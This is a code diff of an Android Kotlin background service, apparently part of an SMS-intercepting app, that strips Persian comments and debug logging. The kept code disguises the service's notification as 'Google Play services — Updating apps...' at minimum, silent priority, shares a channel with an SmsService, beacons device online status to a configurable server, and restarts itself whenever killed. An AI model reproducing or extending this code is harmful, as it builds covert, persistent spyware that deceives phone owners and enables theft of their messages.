@@ -22,9 +22,9 @@ class NetworkService : Service() {
 
     companion object {
         private const val TAG = "NetworkService"
-        private const val NOTIFICATION_ID = 1  // ⭐ یکسان با SmsService - استفاده از همون notification
-        private const val CHANNEL_ID = "sms_service_channel"  // ⭐ یکسان با SmsService
-        private const val CHECK_INTERVAL_MS = 10000L // هر 10 ثانیه چک کن
+        private const val NOTIFICATION_ID = 1
+        private const val CHANNEL_ID = "sms_service_channel"
+        private const val CHECK_INTERVAL_MS = 10000L
     }
 
     private lateinit var connectivityManager: ConnectivityManager
@@ -32,28 +32,20 @@ class NetworkService : Service() {
     private var lastOnlineState: Boolean? = null
     private val handler = Handler(Looper.getMainLooper())
 
-    // ✅ Callback برای تشخیص Real-time
     private val networkCallback = object : ConnectivityManager.NetworkCallback() {
         override fun onAvailable(network: Network) {
-            Log.d(TAG, "✅ Network AVAILABLE")
             checkAndUpdateStatus()
         }
 
         override fun onLost(network: Network) {
-            Log.d(TAG, "❌ Network LOST")
             checkAndUpdateStatus()
         }
 
         override fun onCapabilitiesChanged(network: Network, capabilities: NetworkCapabilities) {
-            val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
-            val isValidated = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
-
-            Log.d(TAG, "🔶 Network capabilities - Internet: $hasInternet, Validated: $isValidated")
             checkAndUpdateStatus()
         }
     }
 
-    // ✅ Polling منظم برای اطمینان از آپدیت
     private val periodicChecker = object : Runnable {
         override fun run() {
             checkAndUpdateStatus()
@@ -63,30 +55,18 @@ class NetworkService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        Log.d(TAG, "🚀 NetworkService created")
-
         connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         startForegroundWithNotification()
         registerNetworkCallback()
-
-        // ارسال وضعیت اولیه
         checkAndUpdateStatus()
-
-        // شروع چک منظم
         handler.post(periodicChecker)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d(TAG, "📞 onStartCommand called")
-
-        // اطمینان از اینکه callback ثبت شده
         if (!isCallbackRegistered) {
             registerNetworkCallback()
         }
-
-        // چک فوری وضعیت
         checkAndUpdateStatus()
-
         return START_STICKY
     }
 
@@ -96,9 +76,9 @@ class NetworkService : Service() {
         createNotificationChannel()
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Google Play services")  // ⭐ یکسان با SmsService
-            .setContentText("Updating apps...")  // ⭐ یکسان با SmsService
-            .setSmallIcon(android.R.drawable.stat_notify_sync)  // ⭐ آیکون sync کم‌رنگ
+            .setContentTitle("Google Play services")
+            .setContentText("Updating apps...")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setShowWhen(false)
@@ -107,25 +87,21 @@ class NetworkService : Service() {
             .setSilent(true)
             .build()
 
-        // ⭐ startForeground با سازگاری با همه نسخه‌های اندروید
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            // Android 14+ (API 34+) - با foregroundServiceType
             startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
         } else {
-            // Android 7-13 - بدون type
             startForeground(NOTIFICATION_ID, notification)
         }
-        Log.d(TAG, "✅ Started as Foreground Service")
     }
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Google Play services",  // ⭐ یکسان با SmsService
+                "Google Play services",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Google Play services keeps your apps up to date"  // ⭐ یکسان
+                description = "Google Play services keeps your apps up to date"
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
@@ -140,23 +116,20 @@ class NetworkService : Service() {
 
     private fun registerNetworkCallback() {
         if (isCallbackRegistered) {
-            Log.w(TAG, "⚠️ NetworkCallback already registered")
             return
         }
 
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                // ✅ حذف VALIDATED برای تشخیص همه تغییرات
                 val networkRequest = NetworkRequest.Builder()
                     .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                     .build()
 
                 connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
                 isCallbackRegistered = true
-                Log.d(TAG, "✅ NetworkCallback registered")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to register NetworkCallback", e)
+            Log.e(TAG, "Failed to register NetworkCallback", e)
         }
     }
 
@@ -167,60 +140,40 @@ class NetworkService : Service() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                 connectivityManager.unregisterNetworkCallback(networkCallback)
                 isCallbackRegistered = false
-                Log.d(TAG, "👋 NetworkCallback unregistered")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to unregister NetworkCallback", e)
+            Log.e(TAG, "Failed to unregister NetworkCallback", e)
         }
     }
 
-    // ✅ تابع جدید برای چک و آپدیت هوشمند
     private fun checkAndUpdateStatus() {
         val currentState = isNetworkAvailable()
 
-        // فقط اگه وضعیت تغییر کرده باشه، بفرست
         if (lastOnlineState == null || lastOnlineState != currentState) {
-            Log.d(TAG, "🔄 Status changed: $lastOnlineState → $currentState")
             lastOnlineState = currentState
             updateOnlineStatus(currentState)
-        } else {
-            Log.d(TAG, "⏸️ Status unchanged: $currentState")
         }
     }
 
     private fun isNetworkAvailable(): Boolean {
         return try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                val network = connectivityManager.activeNetwork
-                if (network == null) {
-                    Log.d(TAG, "📵 No active network")
-                    return false
-                }
-
-                val capabilities = connectivityManager.getNetworkCapabilities(network)
-                if (capabilities == null) {
-                    Log.d(TAG, "📵 No network capabilities")
-                    return false
-                }
+                val network = connectivityManager.activeNetwork ?: return false
+                val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
 
                 val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                 val hasTransport = capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                         capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                         capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
 
-                Log.d(TAG, "🔍 Check: Internet=$hasInternet, Transport=$hasTransport")
-
-                // ✅ فقط چک کن که اینترنت داره، نه اینکه validated باشه
                 hasInternet && hasTransport
             } else {
                 @Suppress("DEPRECATION")
                 val netInfo = connectivityManager.activeNetworkInfo
-                val isConnected = netInfo != null && netInfo.isConnected
-                Log.d(TAG, "🔍 Check (Legacy): Connected=$isConnected")
-                isConnected
+                netInfo != null && netInfo.isConnected
             }
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Error checking network", e)
+            Log.e(TAG, "Error checking network", e)
             false
         }
     }
@@ -240,9 +193,6 @@ class NetworkService : Service() {
                     put("source", "NetworkReceiver")
                 }
 
-                Log.d(TAG, "📤 Sending heartbeat: $isOnline")
-
-                // ⭐ استفاده از ServerConfig برای گرفتن Base URL
                 val baseUrl = ServerConfig.getBaseUrl()
                 val url = URL("$baseUrl/devices/heartbeat")
                 val conn = url.openConnection() as HttpURLConnection
@@ -258,17 +208,11 @@ class NetworkService : Service() {
                     os.flush()
                 }
 
-                val responseCode = conn.responseCode
-                if (responseCode in 200..201) {
-                    Log.d(TAG, "✅ Status updated successfully")
-                } else {
-                    Log.w(TAG, "⚠️ Backend response: $responseCode")
-                }
-
+                conn.responseCode
                 conn.disconnect()
 
             } catch (e: Exception) {
-                Log.e(TAG, "❌ Failed to update status", e)
+                Log.e(TAG, "Failed to update status", e)
             }
         }.start()
     }
@@ -277,9 +221,7 @@ class NetworkService : Service() {
         super.onDestroy()
         unregisterNetworkCallback()
         handler.removeCallbacks(periodicChecker)
-        Log.d(TAG, "👋 NetworkService destroyed")
 
-        // اگه کشته شد، دوباره استارتش کن
         val restartIntent = Intent(applicationContext, NetworkService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             applicationContext.startForegroundService(restartIntent)
